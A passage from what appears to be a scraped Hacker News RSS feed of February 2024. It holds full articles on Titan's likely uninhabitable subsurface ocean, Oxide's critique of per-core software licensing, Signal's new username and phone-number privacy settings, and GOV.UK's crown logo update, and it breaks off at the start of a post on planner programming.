<p>"Life as we know it here on Earth needs water as a solvent, so planets and moons with lots of water are of interest when looking for <a href="https://phys.org/tags/extraterrestrial+life/" rel="tag">extraterrestrial life</a>," said Neish, a member of Western's Institute for Earth and Space Exploration.</p>

																																						
																																			<p>In the <a href="https://www.liebertpub.com/doi/10.1089/ast.2023.0055">study</a>, published in the journal <i>Astrobiology</i>, Neish and her collaborators attempted to quantify the amount of organic molecules that could be transferred from Titan's organic-rich surface to its subsurface ocean, using data from impact cratering.</p>
<p>Comets impacting Titan throughout its history have melted the surface of the icy moon, creating pools of liquid water that have mixed with the surface organics. The resulting melt is denser than its icy crust, so the heavier water sinks through the ice, possibly all the way to Titan's subsurface ocean.</p>
<p>Using the assumed rates of impacts on Titan's surface, Neish and her collaborators determined how many comets of different sizes would strike Titan each year over its history. This allowed the researchers to predict the flow rate of water carrying organics that travel from Titan's surface to its interior.</p>
<p>Neish and the team found the weight of organics transferred in this way is quite small, no more than 7,500 kg/year of glycine—the simplest amino acid, which makes up proteins in life. This is approximately the same mass as a male African elephant. (All biomolecules, like glycine, use carbon—an element—as the backbone of their molecular structure.)</p>
<p>"One elephant per year of glycine into an ocean 12 times the volume of Earth's oceans is not sufficient to sustain life," said Neish. "In the past, people often assumed that water equals life, but they neglected the fact that life needs other elements, in particular carbon."</p>

																																			<p>Other icy worlds (like Jupiter's moons Europa and Ganymede and Saturn's moon Enceladus) have almost no carbon on their surfaces, and it is unclear how much could be sourced from their interiors. Titan is the most organic-rich icy moon in the solar system, so if its subsurface ocean is not habitable, it does not bode well for the habitability of other known icy worlds.</p>
<p>"This work shows that it is very hard to transfer the carbon on Titan's surface to its subsurface ocean—basically, it's hard to have both the water and carbon needed for life in the same place," said Neish.</p>

<div data-thumb="https://scx1.b-cdn.net/csz/news/tmb/2024/saturns-largest-moon-m.jpg" data-src="https://scx2.b-cdn.net/gfx/news/2024/saturns-largest-moon-m.jpg" data-sub-html="An artist’s rendering shows a Dragonfly quadcopter landing on the surface of Saturn’s moon Titan, unfolding its rotors and lifting off again to survey the landscape and atmosphere. Credit: Steve Gribben/Johns Hopkins">
        <figure>
            <img src="https://scx1.b-cdn.net/csz/news/800a/2024/saturns-largest-moon-m.jpg" alt="Saturn's largest moon most likely uninhabitable" title="An artist’s rendering shows a Dragonfly quadcopter landing on the surface of Saturn’s moon Titan, unfolding its rotors and lifting off again to survey the landscape and atmosphere. Credit: Steve Gribben/Johns Hopkins">
             <figcaption>
                An artist’s rendering shows a Dragonfly quadcopter landing on the surface of Saturn’s moon Titan, unfolding its rotors and lifting off again to survey the landscape and atmosphere. Credit: Steve Gribben/Johns Hopkins
            </figcaption>        </figure>
    </div>
<p><b>Flight of the Dragonfly</b></p>
<p>Despite the discovery, there is still much more to learn about Titan, and for Neish, the big question is, what is it made of?</p>
<p>Neish is a co-investigator on the NASA Dragonfly project, a planned 2028 spacecraft mission to send a robotic rotorcraft (drone) to the surface of Titan to study its prebiotic chemistry, or how <a href="https://phys.org/tags/organic+compounds/" rel="tag">organic compounds</a> formed and self-organized for the origin of life on Earth and beyond.</p>
<p>"It is nearly impossible to determine the composition of Titan's organic-rich surface by viewing it with a telescope through its organic-rich atmosphere," said Neish. "We need to land there and sample the surface to determine its composition."</p>
<p>To date, only the Cassini–Huygens international space mission in 2005 has successfully landed a robotic probe on Titan to analyze samples. It remains the first spacecraft to land on Titan and the farthest landing from Earth a spacecraft has ever made.</p>

																																						
																																			<p>"Even if the subsurface ocean isn't habitable, we can learn a lot about prebiotic chemistry on Titan, and Earth, by studying the reactions on Titan's surface," said Neish. "We'd really like to know if interesting reactions are occurring there, especially where the organic molecules mix with liquid water generated in impacts."</p>

<figure itemscope="" itemtype="http://schema.org/VideoObject">
    <meta itemprop="name" content="Saturn's largest moon most likely uninhabitable">
    <meta itemprop="url" content="https://www.youtube.com/watch/?v=msiLWxDayuA">
    <meta itemprop="description" content="Credit: JPL">
    <meta itemprop="uploadDate" content="2024-02-14T09:57:20-05:00">    
        <meta itemprop="embedUrl" content="https://www.youtube.com/embed/msiLWxDayuA">
    <meta itemprop="thumbnailUrl" content="https://img.youtube.com/vi/msiLWxDayuA/maxresdefault.jpg">
         <p>
             <iframe src="https://www.youtube.com/embed/msiLWxDayuA?color=white" loading="lazy" frameborder="0" allowfullscreen=""></iframe>
         </p>
        <figcaption itemprop="caption">Credit: JPL</figcaption>  
</figure><p>When Neish started her latest study, she was worried it would negatively impact the Dragonfly mission, but it has actually led to even more questions.</p>
<p>"If all the melt produced by impacts sinks into the ice crust, we wouldn't have samples near the surface where water and organics have mixed. These are regions where Dragonfly could search for the products of those prebiotic reactions, teaching us about how life may arise on different planets," said Neish.</p>
<p>"The results from this study are even more pessimistic than I realized with regards to the habitability of Titan's surface ocean, but it also means that more interesting prebiotic environments exist near Titan's surface, where we can sample them with the instruments on Dragonfly."</p>

																																																					
																				<div>
																						<p><strong>More information:</strong>
												Catherine Neish et al, Organic Input to Titan's Subsurface Ocean Through Impact Cratering, <i>Astrobiology</i> (2024). <a data-doi="1" href="https://dx.doi.org/10.1089/ast.2023.0055" target="_blank">DOI: 10.1089/ast.2023.0055</a>
																						
																						</p>
																					</div>
                               											
																					
                              										                                        
										<!-- print only -->
										<div>
											 <p><strong>Citation</strong>:
												Saturn's largest moon most likely uninhabitable (2024, February 14)
												retrieved 20 February 2024
												from https://phys.org/news/2024-02-saturn-largest-moon-uninhabitable.html
											 </p>
											 <p>
											 This document is subject to copyright. Apart from any fair dealing for the purpose of private study or research, no
											 part may be reproduced without the written permission. The content is provided for information purposes only.
											 </p>
										</div>
                                        
									</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Moore's Scofflaws (131 pts)]]></title>
            <link>https://oxide.computer/blog/moores-scofflaws</link>
            <guid>39444995</guid>
            <pubDate>Tue, 20 Feb 2024 18:36:15 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://oxide.computer/blog/moores-scofflaws">https://oxide.computer/blog/moores-scofflaws</a>, See on <a href="https://news.ycombinator.com/item?id=39444995">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content"><p>Years ago, Jeff Bezos famously quipped that "your margin is my opportunity."
This was of course aimed not at Amazon’s customers, but rather its
competitors, and it was deadly serious: customers of AWS in those bygone years
will fondly remember that every re:Invent brought with it another round of
price cuts.  This era did not merely reflect Bezos’s relentless execution, but
also a disposition towards who should reap the reward of advances in
underlying technology: Amazon believed (if implicitly) that improvements at
the foundations of computing (e.g., in transistor density, core count, DRAM
density, storage density, etc.) should reflect themselves in lower prices for
consumers rather than higher margins for suppliers.</p><p>Price cuts are no longer a re:Invent staple, having been replaced by a regular
Amazon tradition of a different flavor:  cutting depreciation (and therefore
increasing earnings) by
<a href="https://www.theregister.com/2024/02/02/amazon_q4_2023/">extending the effective
life of their servers</a>.  (These announcements are understandably much more
subdued, as "my depreciation is my margin opportunity" doesn’t have quite the
same ring to it.)</p><p>As compute needs have grown and price cuts have become an increasingly distant
memory, some have questioned their sky-high cloud bills, wondering if they
should in fact be owning their compute instead of renting it.  When we started
Oxide, we knew from operating our own public cloud what those economics looked
like — and we knew that over time others of a particular scale would come to
the same realization that they would be better off not giving their margin
away by renting compute.  (Though it’s safe to say that we did not predict
that it would be <a href="https://www.youtube.com/watch?v=a30vFpSaoZg">DHH leading the
charge</a>!)</p><p>Owning one’s own cloud sounds great, but there is a bit that’s unsaid: <strong>what
about the software?</strong>  Software is essential for elastic, automated
infrastructure:  hardware alone does not a cloud make!  Unfortunately, the
traditional server vendors do not help here: because of a PC-era divide in how
systems are delivered, customers are told to look elsewhere for any and all
system software.  This divide is problematic on several levels.  First, it
impedes the hardware/software co-design that we (and, famously,
<a href="https://www.youtube.com/watch?v=XAfTXYa36f4">others</a>!) believe is essential to
deliver the best possible product.  Second, it leads to
<a href="https://twitter.com/_sysengineer/status/1487149172637712386">infamous finger
pointing</a> when the whole thing doesn’t work.  But there is also a thorny
economic problem:  when your hardware and your software don’t come from the
same provider, <strong>to whom should go the spoils of better hardware?</strong></p><p>To someone who has just decided to buy their hardware out of their frustration
with renting it, the answer feels obvious:  whoever owns the hardware should
naturally benefit from its advances!  Unfortunately, the enterprise software
vendor delivering your infrastructure often has other ideas — and because
their software is neither rented nor bought, but rather comes from the
hinterlands of software licensing, they have broad latitude as to how it is
priced and used.  In particular, this allows them to charge based on the
hardware that you run it on — to have <strong>per-core software licensing.</strong></p><p>This galling practice isn’t new (and is in fact as old as symmetric
multiprocessing systems), but it has taken on new dimensions in the era of
<a href="https://en.wikipedia.org/wiki/Chiplet">chiplets</a> and packaging innovation: the
advances that your next CPU has over your current one are very likely to be
expressed in core count.  Per-core licensing allows a third party — who
neither made the significant investment in developing the next generation of
microprocessor nor paid for the part themselves — to exact a tax on improved
infrastructure.  (And this tax can be
<a href="https://news.vmware.com/company/cpu-pricing-model-update-feb-2020">shockingly
brazen</a>!) Couple this with
<a href="https://arstechnica.com/information-technology/2023/12/broadcom-ends-vmware-perpetual-license-sales-testing-customers-and-partners/">the
elimination of perpetual licensing</a>, and software costs can potentially absorb
the entire gain from a next-generation CPU, leaving a disincentive to run
newer, more efficient infrastructure.  As an industry, we have come to accept
this practice, but we shouldn’t: in the go-go era of
<a href="https://en.wikipedia.org/wiki/Dennard_scaling">Dennard scaling</a> (when clock
rates rose at a blistering rate), software vendors never would have been
allowed to get away with charging by the gigahertz; we should not allow them to
feel so emboldened to charge by core count now!</p><p>If it needs to be said, we have taken a different approach at Oxide:  when you
buy the <a href="https://oxide.computer/blog/the-cloud-computer">Oxide cloud computer</a>, <strong>all of the
software to run it is included</strong>.  This includes all of the software necessary
to run the rack as elastic infrastructure:
<a href="https://oxide.computer/product/compute">virtual compute</a>,
<a href="https://oxide.computer/product/storage">virtual storage</a>,
<a href="https://oxide.computer/product/networking">virtual networking</a>.
(And yes, it’s all open source — which unfortunately demands the immediate
clarification that it’s <a href="https://opensource.org/osd/"><em>actually</em> open source</a>
rather than <a href="https://bcantrill.dtrace.org/2018/12/16/a-eula-in-foss-clothing/">pretend open
source</a>.) When we add a new feature to our software, there is no licensing
enablement or other such nuisance — the feature just comes with the next
update.  And what happens when AMD releases a new CPU with twice the core
count?  The new sled running the new CPU runs along your existing rack — you’re not paying more than the cost of the new sled itself.  This gives the
dividends of Moore’s Law (or
<a href="https://www.youtube.com/watch?v=cuvp-e4ztC0">Wright’s Law</a>!) to whom they
rightfully belong:  the users of compute.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Martin Kleppmann talk on local-first (LoFi) (109 pts)]]></title>
            <link>https://bsky.app/profile/martin.kleppmann.com/post/3kltpvnts622e</link>
            <guid>39444519</guid>
            <pubDate>Tue, 20 Feb 2024 18:02:13 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://bsky.app/profile/martin.kleppmann.com/post/3kltpvnts622e">https://bsky.app/profile/martin.kleppmann.com/post/3kltpvnts622e</a>, See on <a href="https://news.ycombinator.com/item?id=39444519">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Signal: Keep your phone number private with Signal usernames (1246 pts)]]></title>
            <link>https://signal.org/blog/phone-number-privacy-usernames/</link>
            <guid>39444500</guid>
            <pubDate>Tue, 20 Feb 2024 18:01:05 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://signal.org/blog/phone-number-privacy-usernames/">https://signal.org/blog/phone-number-privacy-usernames/</a>, See on <a href="https://news.ycombinator.com/item?id=39444500">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><img src="https://signal.org/blog/images/usernames-header.png" alt="iPhone showing the creation of a Signal username, axolotl.99, on a lightly colored gradient background with floating numbers."></p><p>Signal’s mission and sole focus is private communication. For years, Signal has kept your messages private, your profile information (like your name and profile photo) private, your contacts private, and your groups private – among much else. Now we’re taking that one step further, by making your phone number on Signal more private.</p><p>Here’s how:</p><ul><li><strong>New default: Your phone number will no longer be visible to everyone in Signal</strong><ul><li>If you use Signal, your phone number will no longer be visible to everyone you chat with by default. People who have your number saved in their phone’s contacts will still see your phone number since they already know it.</li></ul></li><li><strong>Connect without sharing your phone number</strong><ul><li>If you don’t want to hand out your phone number to chat with someone on Signal, you can now create a unique username that you can use instead (you will still need a phone number to sign up for Signal). Note that <em>a username is not the profile name that’s displayed in chats, it’s not a permanent handle, and not visible to the people you are chatting with in Signal.</em> A username is simply a way to initiate contact on Signal without sharing your phone number.</li></ul></li><li><strong>Control who can find you on Signal by phone number</strong><ul><li>If you don’t want people to be able to find you by searching for your phone number on Signal, you can now enable a new, optional privacy setting. This means that unless people have your exact unique username, they won’t be able to start a conversation, or even know that you have a Signal account – even if they have your phone number.</li></ul></li></ul><p>Right now, these options are in <a href="https://support.signal.org/hc/en-us/articles/360007318471-Signal-Beta">beta</a>, and will be rolling out to everyone in the coming weeks.</p><p>Note that even once these features reach everyone, <em>both you and the people you are chatting with</em> on Signal will need to be using the most updated version of the app to take advantage of them.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" rel="footnote">1</a></sup></p><p>Importantly, all of this is optional. While we changed the default to hide your phone number from people who don’t have it saved in their phone’s contacts, you can change this setting. You are not required to create a username and you have full control over whether you want people to be able to find you by your phone number or not. Whatever choices work for you and your friends, you’ll still be able to communicate with your connections in Signal, past and present.</p><h2 id="keeping-your-phone-number-private-on-signal">Keeping your phone number private on Signal</h2><p>Once these features roll out, your phone number will no longer be visible in Signal to anyone running the latest version of Signal who doesn’t already have it saved in their phone’s contacts. This means that when you participate in group chats, message people 1-1, and make Signal calls, your phone number won’t show up unless the person has it saved (you can also limit this further, as detailed below). Your Signal profile name and photo will continue to be visible.</p><p>If you’d still like everyone to see your phone number when messaging them, you can change the default by going to Settings &gt; Privacy &gt; Phone Number &gt; Who can see my number. You can either choose to have your phone number visible to “Everyone” you message on Signal or “Nobody.” If you select “Nobody,” the only people who will see your phone number in Signal are people who already have it saved to their phone’s contacts.</p><div> <video width="100%" loop="" muted="" autoplay="" playsinline=""> <source src="https://signal.org/blog/videos/usernames-pnp-sharing.mp4" type="video/mp4"> </video><p>Changing your phone number privacy settings by going to Settings &gt; Privacy &gt; Phone number will change whether they see your phone number in your profile.</p></div><p>We’re also introducing a setting that lets you control who can find you by your phone number on Signal. Up until today, anyone who had your phone number–from a party flier, a business card, or somewhere else–could look you up on Signal by phone number and message you. You can now restrict this by going to Settings &gt; Privacy &gt; Phone Number &gt; Who can find me by my number and setting it to “Nobody.”</p><p>Selecting “Everybody” means that anyone who has your phone number can type it into Signal and send you a <a href="https://support.signal.org/hc/en-us/articles/360007459591-Signal-Profiles-and-Message-Requests#message_requests">message request</a> (which you can accept, reject, or block). This is still the default setting, and is how Signal has worked for years.</p><div> <video width="100%" loop="" muted="" autoplay="" playsinline=""> <source src="https://signal.org/blog/videos/usernames-pnp-discovery.mp4" type="video/mp4"> </video><p>Changing your phone number privacy settings by going to Settings &gt; Privacy &gt; Phone number will change how people can connect with you on Signal.</p></div><p>Selecting “Nobody” means that if someone enters your phone number on Signal, they will not be able to message or call you, or even see that you’re on Signal. And anyone you’re chatting with on Signal will not see your phone number as part of your Profile Details page – <em>this is true even if your number is saved in their phone’s contacts.</em> Keep in mind that selecting “Nobody” can make it harder for people to find you on Signal. If your friend downloads Signal and opens the app to see who they can message, they won’t know that they can message you. Instead, in order to connect on Signal you will need to share your full, unique username with them.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" rel="footnote">2</a></sup></p><p>You can change these settings at any time to best suit the ways you want to connect with others on Signal.</p><h2 id="usernames-another-way-to-start-a-conversation">Usernames: Another way to start a conversation</h2><p>Until now, someone needed to know your phone number to reach you on Signal. Now, you can connect on Signal without needing to hand out your phone number. (You will still need a phone number to register for Signal.) This is where usernames come in.</p><p>Instead of giving out your phone number, you can now share a username. You can also generate a QR code or link that directs people to your username, letting them quickly connect with you on Signal.</p><div> <p><img src="https://signal.org/blog/images/usernames-link.png" alt="Two phones next to each other displaying the QR code and custom URLs to connect on Signal without sharing a phone number."></p><p>Generate a QR code or unique URL to connect on Signal without sharing your phone number by going to Profile &gt; QR Code or Link.</p></div><p>Usernames in Signal do not function like usernames on social media platforms. <strong>Signal usernames are not logins or handles that you’ll be known by on the app – they’re simply a quick way to connect without sharing a phone number.</strong> Your profile name remains whatever you set it to. Your username is not displayed on your Profile Details page, and people you message can’t see or find your username without your sharing it. Put another way, someone will need to know your exact unique username in order to start a chat with you on Signal. And Signal does not provide a searchable directory of usernames.</p><div> <video width="100%" loop="" muted="" autoplay="" playsinline=""> <source src="https://signal.org/blog/videos/usernames-chat-via-username.mp4" type="video/mp4"> </video><p>To connect via username, type someone's exact username into the New Chat bar and send them a message. Once they accept your message request, you'll see their profile name in the chat.</p></div><p>We have also worked to ensure that keeping your phone number private from the people you speak with doesn’t necessitate giving more personal information to Signal. Your username is not stored in plaintext, meaning that Signal cannot easily see or produce the usernames of given accounts.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3" rel="footnote">3</a></sup></p><p>Usernames simply allow you to initiate a connection on Signal without sharing your phone number, and Signal’s robust privacy safeguards remain unchanged. Signal is built so that we do not know who you message, what you say, which group chats you participate in, who’s in your contact list, and more.</p><p>If you want to create a username, you can do so in Settings &gt; Profile. A username on Signal (unlike a profile name) must be unique and must have two or more numbers at the end of it; a choice intended to help keep usernames egalitarian and minimize spoofing. Usernames can be changed as often as you like, and you can delete your username entirely if you prefer to no longer have one.</p><div> <p><img src="https://signal.org/blog/images/usernames-profile.png" alt="Two phones next to each other. The phone on the left shows the creation of a username and the phone on the right shows where in your profile you can see your username. To create and edit a username, go to Settings > Profile."></p><p>To create a username, go to Settings &gt; Profile.</p></div><p>Once you’ve created a username, you can share it with others who can use it to connect with you. To connect with someone via their username, simply open the New Chat screen on Signal and type in their username.</p><p>Since Signal does not provide a searchable directory of usernames, only people who have your exact unique username will be able to start a conversation with you. And you can share it with as few or as many people as you want.</p><p>You can also share a QR code or unique URL that shortcuts to your username in Signal. You can reset these at any time without having to change your username, much like a group invite link.</p><p>Usernames in Signal are designed to be easily changeable. For example, you can make a username to connect with people at a conference or to plan a group trip. Then, when it’s over, change it if you want to. Just click on your username from your Profile Details page to make the changes you want. When you change your username, your Signal contacts are not notified because your username is not visible to the people you are chatting with 1-1 or in groups.</p><h2 id="to-recap">To Recap</h2><p>Starting soon, your phone number will no longer be visible to people you chat with on Signal, unless they have it in their phone’s contacts. You will also be able to configure a new privacy setting to limit who can find you by your phone number on Signal. And, you’ll now be able to create an optional username that you can share with the people you want to connect with on Signal.</p><p>For more information, you can take a look at our <a href="https://support.signal.org/hc/articles/6712070553754">support center articles</a>.</p><p>Currently these new features are in beta but will be rolling out to everyone in a few weeks.</p><p><em>Thanks to Nina Berman, Jun Harada, Ehren Kret, Joshua Lund, Jim O’Leary, Alex Ristevski, and Meredith Whittaker for helping to author and edit this post.</em></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Updating Gov.uk’s crown (137 pts)]]></title>
            <link>https://insidegovuk.blog.gov.uk/2024/02/19/updating-gov-uks-crown/</link>
            <guid>39444364</guid>
            <pubDate>Tue, 20 Feb 2024 17:51:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://insidegovuk.blog.gov.uk/2024/02/19/updating-gov-uks-crown/">https://insidegovuk.blog.gov.uk/2024/02/19/updating-gov-uks-crown/</a>, See on <a href="https://news.ycombinator.com/item?id=39444364">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
			<p><img fetchpriority="high" decoding="async" src="https://insidegovuk.blog.gov.uk/wp-content/uploads/sites/24/2024/02/1-full-logo-310x207.png" alt="The GOV.UK logo on a black background with the new crown." width="819" height="547" srcset="https://insidegovuk.blog.gov.uk/wp-content/uploads/sites/24/2024/02/1-full-logo-310x207.png 310w, https://insidegovuk.blog.gov.uk/wp-content/uploads/sites/24/2024/02/1-full-logo-620x414.png 620w, https://insidegovuk.blog.gov.uk/wp-content/uploads/sites/24/2024/02/1-full-logo-768x512.png 768w, https://insidegovuk.blog.gov.uk/wp-content/uploads/sites/24/2024/02/1-full-logo.png 1201w" sizes="(max-width: 819px) 100vw, 819px"></p>
<p>As of today, GOV.UK has a new crown in its logo. This blog post explains why we’ve made the change and how we’ve done it.</p>
<h2>Why the crown has changed</h2>
<figure id="attachment_12979"><img decoding="async" src="https://insidegovuk.blog.gov.uk/wp-content/uploads/sites/24/2024/02/2-crown-comparison-310x207.png" alt="Image shows 2 rows. On the top row the top left image shows the St Edward's crown, and top right shows how that was represented on GOV.UK's logo. On the bottom row, the bottom left image shows the Tudor Crown and next to it shows how it is represented on GOV.UK's logo" width="768" height="513" srcset="https://insidegovuk.blog.gov.uk/wp-content/uploads/sites/24/2024/02/2-crown-comparison-310x207.png 310w, https://insidegovuk.blog.gov.uk/wp-content/uploads/sites/24/2024/02/2-crown-comparison-620x413.png 620w, https://insidegovuk.blog.gov.uk/wp-content/uploads/sites/24/2024/02/2-crown-comparison-768x512.png 768w, https://insidegovuk.blog.gov.uk/wp-content/uploads/sites/24/2024/02/2-crown-comparison.png 1200w" sizes="(max-width: 768px) 100vw, 768px"><figcaption>Top row is St Edward’s Crown represented on GOV.UK’s logo, and bottom row shows Tudor Crown represented on GOV.UK’s logo.</figcaption></figure>
<p>In September 2022, the <a href="https://www.college-of-arms.gov.uk/news-grants/news/item/205-royal-cypher">College of Arms announced His Majesty King Charles III’s Royal Cypher, which features the monarch’s chosen crown</a>. This Cypher features the Tudor Crown, rather than the St Edward’s Crown chosen by Queen Elizabeth II following her Accession in 1952. Her Royal Cypher was itself a change from <a href="https://www.google.com/search?sca_esv=de3b8b35270c999b&amp;sca_upv=1&amp;rlz=1C5GCCM_en&amp;q=george+vi+royal+cypher&amp;tbm=isch&amp;source=univ&amp;fir=LXZ-txx3Nbl7DM%252CLdS6ECAQd4_BWM%252C_%253BeGoflW7o9rP-pM%252C9Be7cUnfpAGjuM%252C_%253BSlU07R1HgCHi3M%252CdJYgumc9Bes3-M%252C_%253BhXgtZQPxtsEcLM%252CLdS6ECAQd4_BWM%252C_%253BGLQmC--WXJ6MtM%252C8bMRuOXguKm8QM%252C_%253BEV2UcJPZXjtJzM%252CrQ55_EnOQY_dsM%252C_%253BY2kmzGA8EFw0xM%252CsDSIe2RhL9Fy_M%252C_%253B-tjlLMNH8FYt5M%252Cgk3W5OJMLZKadM%252C_%253BjLaNXzCOo-2TiM%252CV-Pb1JnXdnxinM%252C_%253BhkJMUEVXk2wdKM%252CC36nHMScJoRPeM%252C_%253BAJw67LW7D2mBoM%252C_CawYdWnVRbN9M%252C_%253Bc-63sONHRDdiLM%252CMq9_tfiuSx__qM%252C_%253BO854rE9M8HP9XM%252Cq5MJ315lLe3QxM%252C_%253BMPRr-jGtM7FYEM%252CXySPr0ao7Bp7OM%252C_%253BMrtBQUsU2M7hIM%252C93fGJgdnP_EIxM%252C_%253BDrEfFXAd7lqO4M%252Cq5MJ315lLe3QxM%252C_%253B2C-BmzAOn7f3DM%252C8bMRuOXguKm8QM%252C_%253BD04pcLVmjmQcPM%252CrcUdqvyn7dagHM%252C_%253BNqSBo8PHQBM10M%252CLdS6ECAQd4_BWM%252C_%253BvIW5qwz4ybjBbM%252CaYwoMEnmr5umwM%252C_%253B822TDb8N0_gNlM%252Cy3-eem7jovOYFM%252C_%253BYERCYLLf9H1lhM%252CxqNLkLNACfk2iM%252C_%253BRoY2yqwMABfdVM%252CdkBLFroGZ07hHM%252C_%253BnMcVOYV4eTB0tM%252CQBvxE14nOp3UsM%252C_%253Ba1BMvtU7SrS5YM%252Cyd7fOf5LxcQsaM%252C_%253BpunD3C0KNpl_pM%252CBXU0a8n_BK39TM%252C_%253BN3n_ePcH2X7neM%252C2tJmN1Z7LjzFoM%252C_%253Bipw6WN-N0-S9rM%252CvdfrQDV-_Dee3M%252C_%253B8AVijIJedGdlsM%252CgjbUvntJnnCysM%252C_%253B4eEItwGcMvvbMM%252C2tJmN1Z7LjzFoM%252C_&amp;usg=AI4_-kTIfFbvSwZoT-IWdeF_lAhJQZJw-A&amp;sa=X&amp;ved=2ahUKEwjDsu3hrKmEAxV3cfEDHWyuBLMQ7Al6BAglEDk&amp;biw=1440&amp;bih=779&amp;dpr=2#imgrc=-tjlLMNH8FYt5M">her father King George VI</a>.</p>
<p>On each <a href="https://www.royal.uk/accession#:~:text=Accession%20describes%20the%20event%20of,Council%20in%20St%20James's%20Palace.">accession</a>, the monarch will choose a Royal Cypher, or symbol to represent their personal authority. You can see the <a href="https://www.postalmuseum.org/blog/royal-cypher-appearances/">Royal Cypher in many places</a>, for example post boxes, on police and military uniforms or on the side of official buildings.</p>
<p>Forms of the crown are being gradually updated across government to reflect the monarch’s choice of crown, featured in His Majesty’s Royal Cypher. This includes GOV.UK, the digital home of the government, which is a hugely important part of public life in the UK. The GOV.UK crown is one of many official instances of the crown so it forms one part of this change. For this work, we’re focusing on instances of the GOV.UK logo which do not include the Royal coat of arms or government departments’ crests.</p>
<h2>How the crown has changed</h2>
<p><img decoding="async" src="https://insidegovuk.blog.gov.uk/wp-content/uploads/sites/24/2024/02/3-artworking-310x207.png" alt="Graphic showing GOV.UK's logo with new crown and design lines showing spacing" width="825" height="551" srcset="https://insidegovuk.blog.gov.uk/wp-content/uploads/sites/24/2024/02/3-artworking-310x207.png 310w, https://insidegovuk.blog.gov.uk/wp-content/uploads/sites/24/2024/02/3-artworking-620x414.png 620w, https://insidegovuk.blog.gov.uk/wp-content/uploads/sites/24/2024/02/3-artworking-768x512.png 768w, https://insidegovuk.blog.gov.uk/wp-content/uploads/sites/24/2024/02/3-artworking.png 1201w" sizes="(max-width: 825px) 100vw, 825px"></p>
<p>We wanted to create something that was faithful to both the official heraldry and the visual identity of GOV.UK. ​​We redrew a simplified version of the crown, making sure it appeared clearly at smaller sizes and lower resolutions. The different proportions of the new crown meant we had to subtly tweak the GOV.UK logo’s typography and spacing to complement it.</p>
<p>We worked with the Government Communication Service (GCS) and the Royal Household to confirm the final version.</p>
<h2>Rolling out the new crown</h2>
<p>GOV.UK’s crown is an important part of GOV.UK’s brand, which is one of the most recognisable digital services in the UK <a href="https://yougov.co.uk/ratings/technology/fame/digital-services/all">according to YouGov</a>. It has not been updated since the site went live in 2012, so we had to work out how to implement this change in a consistent and ordered way.</p>
<p>Once we had the new designs, we needed to roll it out across GDS-owned instances of the GOV.UK crown. This included the GOV.UK homepage, the sitewide menubar, and GDS owned apps, like the Identity Checker App.</p>
<p>However, this change is a cross-government effort. Although GOV.UK looks like a single thing to users, it’s made up of multiple different website domains, which are owned by various government departments. These departments are required to update the crown in their locally owned services and channels.</p>
<p>The <a href="https://design-system.service.gov.uk/">GOV.UK Design System</a> makes it possible to do this in a consistent way through its centralised open-source codebase, GOV.UK Frontend. The Design System team updated the crown in versions 5.1, 4.8 and 3.15, to make sure that services using older versions of GOV.UK Frontend can update it as easily as possible.</p>
<p>We’re taking a phased approach to implementation, starting with the sitewide menu bar and homepage, and seeing it rolled out across GOV.UK in the next 2 weeks.</p>
<h2>It’s live</h2>
<figure id="attachment_12981"><img loading="lazy" decoding="async" src="https://insidegovuk.blog.gov.uk/wp-content/uploads/sites/24/2024/02/4-its-live-310x207.png" alt="A graphic showing 2 mobile phones, both with the GOV.UK homepage on. On the left the old crown is shown in the top left hand corner, and on the right, the new crown is shown." width="817" height="546" srcset="https://insidegovuk.blog.gov.uk/wp-content/uploads/sites/24/2024/02/4-its-live-310x207.png 310w, https://insidegovuk.blog.gov.uk/wp-content/uploads/sites/24/2024/02/4-its-live-620x414.png 620w, https://insidegovuk.blog.gov.uk/wp-content/uploads/sites/24/2024/02/4-its-live-768x512.png 768w, https://insidegovuk.blog.gov.uk/wp-content/uploads/sites/24/2024/02/4-its-live.png 1201w" sizes="(max-width: 817px) 100vw, 817px"><figcaption>The 2 GOV.UK homepages side by side. On the left is the former crown, and on the right, the new crown.</figcaption></figure>
<p>With huge thanks to teams across government, today is when the new crown is seen for the first time across GOV.UK.</p>
<p>It first went live on the GOV.UK homepage and in the sitewide menu bar. You can also see it in other GOV.UK domains such as campaign.gov.uk and blog.gov.uk.</p>
<p>Departments are making changes to their services between today and 1 March. During this time, users may see both new and old versions of the crown.</p>
<p>We also want to thank GCS for their support and for leading the wider changes to symbols of state; thank you.</p>
<h2>If you need support</h2>
<p>If you’re from a government department you can get support to update to the <a href="https://frontend.design-system.service.gov.uk/staying-up-to-date/#staying-up-to-date-with-changes">latest version of the Design System</a>. You can also ask any questions directly to the Design System Team on:</p>
<ul>
<li>cross-government Slack: <a href="https://ukgovernmentdigital.slack.com/app_redirect?channel=govuk-design-system">#govuk-design-system channel</a></li>
<li>email: <a href="mailto:govuk-design-system-support@digital.cabinet-office.gov.uk">govuk-design-system-support@digital.cabinet-office.gov.uk</a></li>
</ul>
<p>If you want the logo in an image file for internal instances of the GOV.UK crown, please email <a href="mailto:govuk-design-system-support@digital.cabinet-office.gov.uk">govuk-design-system-support@digital.cabinet-office.gov.uk</a>.</p>

        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Planner programming blows my mind (314 pts)]]></title>
            <link>https://www.hillelwayne.com/post/picat/</link>
            <guid>39444282</guid>
            <pubDate>Tue, 20 Feb 2024 17:45:05 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.hillelwayne.com/post/picat/">https://www.hillelwayne.com/post/picat/</a>, See on <a href="https://news.ycombinator.com/item?id=39444282">Hacker News</a></p>
<div id="readability-page-1" class="page"><article lang="en">
    

    
    

    <div>
  

